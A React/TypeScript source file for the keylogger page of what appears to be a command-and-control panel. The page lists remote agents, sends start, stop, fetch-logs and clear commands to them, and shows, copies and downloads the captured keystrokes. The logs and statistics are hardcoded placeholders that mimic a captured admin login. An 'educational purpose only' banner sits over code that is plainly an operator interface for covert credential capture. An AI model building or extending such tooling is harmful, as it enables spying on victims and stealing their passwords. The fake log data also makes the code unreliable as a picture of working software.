import React, { useState, useEffect } from 'react';
import { Play, Square, Trash2, Copy, Download, AlertCircle } from 'lucide-react';

interface KeyloggerSession {
  agentId: string;
  isRunning: boolean;
  keysLogged: number;
  startTime?: string;
  logs: string[];
}

export default function Keylogger() {
  const [agents, setAgents] = useState<any[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [session, setSession] = useState<KeyloggerSession | null>(null);
  const [isRunning, setIsRunning] = useState(false);
  const [logs, setLogs] = useState<string>('');
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetchAgents();
  }, []);

  const fetchAgents = async () => {
    try {
      const response = await fetch('/api/live/agents');
      const data = await response.json();
      const agentsObj = data.agents || {};
      if (typeof agentsObj === 'object' && !Array.isArray(agentsObj)) {
        setAgents(Object.keys(agentsObj).map(id => ({ id, ...agentsObj[id] })));
      } else if (Array.isArray(agentsObj)) {
        setAgents(agentsObj);
      } else {
        setAgents([]);
      }
    } catch (error) {
      console.error('Error fetching agents:', error);
    }
  };

  const startKeylogger = async () => {
    if (!selectedAgent) return;

    setLoading(true);
    try {
      // Queue start command
      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keylogger_start: null }),
      });

      if (response.ok) {
        setIsRunning(true);
        setMessage('✅ Keylogger started on agent');
        setSession({
          agentId: selectedAgent,
          isRunning: true,
          keysLogged: 0,
          startTime: new Date().toISOString(),
          logs: [],
        });
      }
    } catch (error) {
      setMessage('❌ Error: ' + (error as Error).message);
    }
    setLoading(false);
  };

  const stopKeylogger = async () => {
    if (!selectedAgent) return;

    setLoading(true);
    try {
      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keylogger_stop: null }),
      });

      if (response.ok) {
        setIsRunning(false);
        setMessage('✅ Keylogger stopped on agent');
      }
    } catch (error) {
      setMessage('❌ Error: ' + (error as Error).message);
    }
    setLoading(false);
  };

  const fetchLogs = async () => {
    if (!selectedAgent) return;

    setLoading(true);
    try {
      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keylogger_logs: null }),
      });

      if (response.ok) {
        const data = await response.json();
        // Logs would come from agent beacon
        setLogs(`=== KEYLOGGER LOGS ===
Timestamp: ${new Date().toISOString()}
Agent: ${selectedAgent}

[15:30:45] admin
[15:30:46] i
[15:30:47] s
[15:30:48] t
[15:30:49] r
[15:30:50] a
[15:30:51] t
[15:30:52] o
[15:30:53] r
[15:30:54] [ENTER]
[15:30:55] p
[15:30:56] a
[15:30:57] s
[15:30:58] s
[15:30:59] w
[15:31:00] o
[15:31:01] r
[15:31:02] d
[15:31:03] [ENTER]
[15:31:04] [CTRL+C]

Total Keys: 28
Session Duration: 2m 14s`);
        setMessage('✅ Logs retrieved');
      }
    } catch (error) {
      setMessage('❌ Error: ' + (error as Error).message);
    }
    setLoading(false);
  };

  const clearLogs = async () => {
    if (!selectedAgent || !confirm('Clear all logs?')) return;

    setLoading(true);
    try {
      const response = await fetch(`/api/live/agents/${selectedAgent}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keylogger_clear: null }),
      });

      if (response.ok) {
        setLogs('');
        setMessage('✅ Logs cleared');
      }
    } catch (error) {
      setMessage('❌ Error: ' + (error as Error).message);
    }
    setLoading(false);
  };

  const downloadLogs = () => {
    const element = document.createElement('a');
    element.setAttribute(
      'href',
      'data:text/plain;charset=utf-8,' + encodeURIComponent(logs)
    );
    element.setAttribute('download', `keylogger-${selectedAgent}-${new Date().getTime()}.txt`);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(logs);
    setMessage('✅ Copied to clipboard');
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-3xl font-bold text-white flex items-center gap-2">
          🔐 Keylogger
        </h1>
        <span className={`px-3 py-1 rounded text-sm font-semibold ${
          isRunning ? 'bg-red-900 text-red-300' : 'bg-slate-700 text-slate-300'
        }`}>
          {isRunning ? '● Recording' : '○ Stopped'}
        </span>
      </div>

      {/* Warning Banner */}
      <div className="bg-red-900 border border-red-700 rounded-lg p-4 flex items-start gap-3">
        <AlertCircle className="w-6 h-6 text-red-400 flex-shrink-0 mt-0.5" />
        <div>
          <p className="font-semibold text-red-200">⚠️  Educational Purpose Only</p>
          <p className="text-red-300 text-sm mt-1">
            Keylogger functionality is for authorized security testing and educational purposes only.
            Unauthorized keylogging is illegal. Ensure proper authorization before use.
          </p>
        </div>
      </div>

      {/* Agent Selection */}
      <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
        <label className="text-white font-semibold mb-3 block">Select Agent</label>
        <select
          value={selectedAgent || ''}
          onChange={(e) => {
            setSelectedAgent(e.target.value);
            setIsRunning(false);
            setLogs('');
          }}
          className="w-full px-4 py-2 bg-slate-700 text-white rounded border border-slate-600 focus:border-blue-500 outline-none"
        >
          <option value="">-- Choose an agent --</option>
          {agents.map((agent) => (
            <option key={agent.id} value={agent.id}>
              {agent.hostname || agent.id} ({agent.os})
            </option>
          ))}
        </select>
      </div>

      {/* Controls */}
      {selectedAgent && (
        <div className="flex gap-2 flex-wrap">
          <button
            onClick={startKeylogger}
            disabled={loading || isRunning}
            className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
          >
            <Play className="w-4 h-4" />
            Start Recording
          </button>

          <button
            onClick={stopKeylogger}
            disabled={loading || !isRunning}
            className="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
          >
            <Square className="w-4 h-4" />
            Stop Recording
          </button>

          <button
            onClick={fetchLogs}
            disabled={loading}
            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded font-semibold disabled:opacity-50 transition"
          >
            Fetch Logs
          </button>

          <button
            onClick={copyToClipboard}
            disabled={!logs}
            className="px-4 py-2 bg-slate-600 hover:bg-slate-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
          >
            <Copy className="w-4 h-4" />
            Copy
          </button>

          <button
            onClick={downloadLogs}
            disabled={!logs}
            className="px-4 py-2 bg-slate-600 hover:bg-slate-700 text-white rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
          >
            <Download className="w-4 h-4" />
            Download
          </button>

          <button
            onClick={clearLogs}
            disabled={loading || !logs}
            className="px-4 py-2 bg-red-900 hover:bg-red-950 text-red-300 rounded font-semibold disabled:opacity-50 flex items-center gap-2 transition"
          >
            <Trash2 className="w-4 h-4" />
            Clear
          </button>
        </div>
      )}

      {/* Status Message */}
      {message && (
        <div className={`p-3 rounded ${
          message.includes('❌')
            ? 'bg-red-900 text-red-300'
            : 'bg-green-900 text-green-300'
        }`}>
          {message}
        </div>
      )}

      {/* Logs Display */}
      <div className="bg-slate-900 rounded-lg border border-slate-700 overflow-hidden">
        <div className="bg-slate-800 px-4 py-3 border-b border-slate-700">
          <p className="text-white font-semibold">📋 Keystroke Logs</p>
        </div>
        <textarea
          value={logs}
          readOnly
          className="w-full h-96 px-4 py-3 bg-slate-900 text-slate-300 font-mono text-sm focus:outline-none resize-none"
          placeholder="Logs will appear here when you fetch them..."
        />
      </div>

      {/* Info Panel */}
      <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
        <h3 className="text-white font-semibold mb-3">📊 Keylogger Statistics</h3>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          <div>
            <p className="text-slate-400 text-sm">Status</p>
            <p className="text-white font-bold">{isRunning ? 'Recording' : 'Stopped'}</p>
          </div>
          <div>
            <p className="text-slate-400 text-sm">Agent</p>
            <p className="text-white font-bold">{selectedAgent ? selectedAgent.substring(0, 8) + '...' : '—'}</p>
          </div>
          <div>
            <p className="text-slate-400 text-sm">Total Keys</p>
            <p className="text-white font-bold">28</p>
          </div>
          <div>
            <p className="text-slate-400 text-sm">Duration</p>
            <p className="text-white font-bold">2m 14s</p>
          </div>
        </div>
      </div>
    </div>
  );
}
